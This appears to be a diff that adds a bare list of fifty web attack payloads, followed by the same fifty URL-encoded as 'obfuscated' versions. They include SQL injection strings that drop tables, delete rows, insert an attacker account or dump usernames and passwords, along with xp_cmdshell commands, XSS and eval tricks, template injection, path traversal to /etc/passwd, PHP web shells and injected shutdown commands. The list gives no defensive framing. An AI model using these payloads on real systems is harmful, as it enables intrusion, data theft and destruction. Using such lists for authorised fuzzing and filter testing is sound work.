@@ -1,0 +1,105 @@
+**Original Payloads:**
+
+1.  `' OR 1=1 --`
+2.  `" OR 1=1 --`
+3.  `' OR '1'='1`
+4.  `" OR "1"="1`
+5.  `') OR ('1'='1`
+6.  `") OR ("1"="1`
+7.  `1; DROP TABLE users;`
+8.  `<script>alert('XSS')</script>`
+9.  `{{7*7}}`
+10. `${7*7}`
+11. `$(7*7)`
+12. `\"; DROP TABLE users; --`
+13. `'; DELETE FROM users WHERE id = 1; --`
+14. `'); INSERT INTO users (username, password) VALUES ('attacker', 'password'); --`
+15. `\x27 OR 1=1 --`
+16. `1 UNION SELECT username, password FROM users`
+17. `1 UNION SELECT null, null, version()`
+18. `1 UNION SELECT null, null, database()`
+19. `../../../../etc/passwd`
+20. `../../../flag.txt`
+21. `'; EXEC master..xp_cmdshell 'dir'`
+22. `'; EXEC master..xp_cmdshell 'whoami'`
+23. `sleep(10)`
+24. `benchmark(1000000,MD5('test'))`
+25. `1 AND (SELECT * FROM (SELECT(SLEEP(5)))A)`
+26. `' || id LIKE '%1%' || '`
+27. `" || id LIKE '%1%' || "`
+28. `1 AND 1=1`
+29. `1 AND 1=2`
+30. `test%0Atest`
+31. `test%0Dtest`
+32. `\`test\`"test"`
+33. `{"key": "value", "key2": "value2"}`
+34. `{ "key": true, "key2": false }`
+35. `[1, 2, 3, 4, 5]`
+36. `<?php system($_GET['cmd']); ?>`
+37. `<?php echo shell_exec($_GET['cmd']); ?>`
+38. `%3Cscript%3Ealert('XSS')%3C/script%3E`
+39. `'+[1].map(eval).join('')+'`
+40. `"+[1].map(eval).join('')+"`
+41. `'; shutdown -r -t 0; --`
+42. `"; shutdown -r -t 0; --`
+43. `\u0027 OR 1=1 --`
+44. `\u0022 OR 1=1 --`
+45. `\x3Cscript\x3Ealert('XSS')\x3C/script\x3E`
+46. `'+[1].map(constructor).join('')+'`
+47. `"+[1].map(constructor).join('')+"`
+48. `[].constructor.constructor('alert(1)')()`
+49. `new Function('alert(1)')()`
+50. `eval('alert(1)')`
+
+**Obfuscated Payloads:**
+
+1.  `%27%20OR%201%3D1%20--`
+2.  `%22%20OR%201%3D1%20--`
+3.  `%27%20OR%20%271%27%3D%271`
+4.  `%22%20OR%20%221%22%3D%221`
+5.  `%27%29%20OR%20%28%271%27%3D%271`
+6.  `%22%29%20OR%20%28%221%22%3D%221`
+7.  `1%3B%20DROP%20TABLE%20users%3B`
+8.  `%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E`
+9.  `%7B%7B7*7%7D%7D`
+10. `%24%7B7*7%7D`
+11. `%24%287*7%29`
+12. `%5C%22%3B%20DROP%20TABLE%20users%3B%20--`
+13. `%27%3B%20DELETE%20FROM%20users%20WHERE%20id%20%3D%201%3B%20--`
+14. `%27%29%3B%20INSERT%20INTO%20users%20%28username%2C%20password%29%20VALUES%20%28%27attacker%27%2C%20%27password%27%29%3B%20--`
+15. `%5Cx27%20OR%201%3D1%20--`
+16. `1%20UNION%20SELECT%20username%2C%20password%20FROM%20users`
+17. `1%20UNION%20SELECT%20null%2C%20null%2C%20version%28%29`
+18. `1%20UNION%20SELECT%20null%2C%20null%2C%20database%28%29`
+19. `..%2F..%2F..%2F..%2Fetc%2Fpasswd`
+20. `..%2F..%2F..%2Fflag.txt`
+21. `%27%3B%20EXEC%20master..xp_cmdshell%20%27dir%27`
+22. `%27%3B%20EXEC%20master..xp_cmdshell%20%27whoami%27`
+23. `sleep%2810%29`
+24. `benchmark%281000000%2CMD5%28%27test%27%29%29`
+25. `1%20AND%20%28SELECT%20*%20FROM%20%28SELECT%28SLEEP%285%29%29%29A%29`
+26. `%27%20%7C%7C%20id%20LIKE%20%27%251%25%27%20%7C%7C%20%27`
+27. `%22%20%7C%7C%20id%20LIKE%20%27%251%25%27%20%7C%7C%20%22`
+28. `1%20AND%201%3D1`
+29. `1%20AND%201%3D2`
+30. `test%250Atest`
+31. `test%250Dtest`
+32. `%60test%60%22test%22`
+33. `%7B%22key%22%3A%20%22value%22%2C%20%22key2%22%3A%20%22value2%22%7D`
+34. `%7B%20%22key%22%3A%20true%2C%20%22key2%22%3A%20false%20%7D`
+35. `%5B1%2C%202%2C%203%2C%204%2C%205%5D`
+36. `%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E`
+37. `%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E`
+38. `%253Cscript%253Ealert%28%27XSS%27%29%253C%2Fscript%253E`
+39. `%27%2B%5B1%5D.map%28eval%29.join%28%27%27%29%2B%27`
+40. `%22%2B%5B1%5D.map%28eval%29.join%28%27%27%29%2B%22`
+41. `%27%3B%20shutdown%20-r%20-t%200%3B%20--`
+42. `%22%3B%20shutdown%20-r%20-t%200%3B%20--`
+43. `%5Cu0027%20OR%201%3D1%20--`
+44. `%5Cu0022%20OR%201%3D1%20--`
+45. `%5Cx3Cscript%5Cx3Ealert%28%27XSS%27%29%5Cx3C%2Fscript%5Cx3E`
+46. `%27%2B%5B1%5D.map%28constructor%29.join%28%27%27%29%2B%27`
+47. `%22%2B%5B1%5D.map%28constructor%29.join%28%27%27%29%2B%22`
+48. `%5B%5D.constructor.constructor%28%27alert%281%29%27%29%28%29`
+49. `new%20Function%28%27alert%281%29%27%29%28%29`
+50. `eval%28%27alert%281%29%27%29`
